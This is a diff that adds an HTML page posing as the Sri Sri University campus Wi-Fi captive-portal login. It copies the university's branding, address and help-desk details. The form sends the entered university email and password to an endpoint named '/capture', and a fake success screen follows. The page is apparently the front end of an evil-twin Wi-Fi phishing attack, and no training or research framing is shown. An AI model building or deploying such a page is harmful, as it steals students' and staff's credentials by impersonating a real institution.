@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sri Sri University - Campus Wi-Fi Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="Sri_Sri_University_Logo.png">
+</head>
+<body>
+    <div class="overlay" id="overlay">
+        <!-- Background campus image -->
+        <div class="bg-image"></div>
+        <div class="bg-overlay"></div>
+
+        <div class="modal">
+            <!-- Top bar -->
+            <div class="top-bar">
+                <span>SSU Campus Network</span>
+                <span class="secure-badge">&#128274; Secure Login</span>
+            </div>
+
+            <div class="modal-content">
+                <!-- Logo and branding -->
+                <div class="logo-section">
+                    <img src="Sri_Sri_University_Logo.png" alt="Sri Sri University" class="university-logo">
+                    <h1>Sri Sri University</h1>
+                    <p class="tagline">A Global University for Holistic Education</p>
+                </div>
+
+                <div class="divider"></div>
+
+                <div class="wifi-info">
+                    <div class="wifi-icon">
+                        <svg viewBox="0 0 24 24" width="28" height="28" fill="#1B5E20">
+                            <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <p class="wifi-title">SSU Aruba Campus Wi-Fi</p>
+                        <p class="wifi-subtitle">Sign in to access the university network</p>
+                    </div>
+                </div>
+
+                <form id="loginForm" action="/capture" method="POST">
+                    <div class="form-group">
+                        <label for="email">University Email / Student ID</label>
+                        <div class="input-wrapper">
+                            <svg class="input-icon" viewBox="0 0 24 24" width="18" height="18" fill="#888">
+                                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                            </svg>
+                            <input type="email" id="email" name="email" placeholder="yourname@srisriuniversity.edu.in" required autocomplete="email">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="input-wrapper">
+                            <svg class="input-icon" viewBox="0 0 24 24" width="18" height="18" fill="#888">
+                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                            </svg>
+                            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                        </div>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="agree" name="agree" required>
+                        <label for="agree">I agree to the <a href="#" onclick="return false;">SSU Acceptable Use Policy</a> and <a href="#" onclick="return false;">Terms of Service</a></label>
+                    </div>
+
+                    <button type="submit" id="loginBtn">
+                        <span id="btnText">Sign In to Campus Network</span>
+                        <span id="btnSpinner" class="spinner hidden"></span>
+                    </button>
+                </form>
+
+                <div class="help-section">
+                    <p>Having trouble signing in?</p>
+                    <p>Contact IT Help Desk: <strong>info@srisriuniversity.edu.in</strong></p>
+                    <p>Phone: <strong>7894424562</strong></p>
+                </div>
+
+                <div class="footer-text">
+                    <div class="footer-logos">
+                        <span class="badge">UGC Approved</span>
+                        <span class="badge">NAAC Accredited</span>
+                        <span class="badge">AICTE</span>
+                    </div>
+                    <p class="copyright">&copy; 2026 Sri Sri University, Cuttack, Odisha, India</p>
+                    <p class="footer-address">Sri Sri Vihar, Ward No – 3, Godi Sahi, Cuttack – 754006</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success page (hidden initially) -->
+    <div class="success-page hidden" id="successPage">
+        <div class="bg-image"></div>
+        <div class="bg-overlay"></div>
+        <div class="success-modal">
+            <img src="Sri_Sri_University_Logo.png" alt="SSU" class="success-logo">
+            <div class="success-icon">&#10003;</div>
+            <h2>Connected Successfully!</h2>
+            <p>Welcome to SSU Campus Network.</p>
+            <p class="redirect-text">Redirecting you to the internet...</p>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
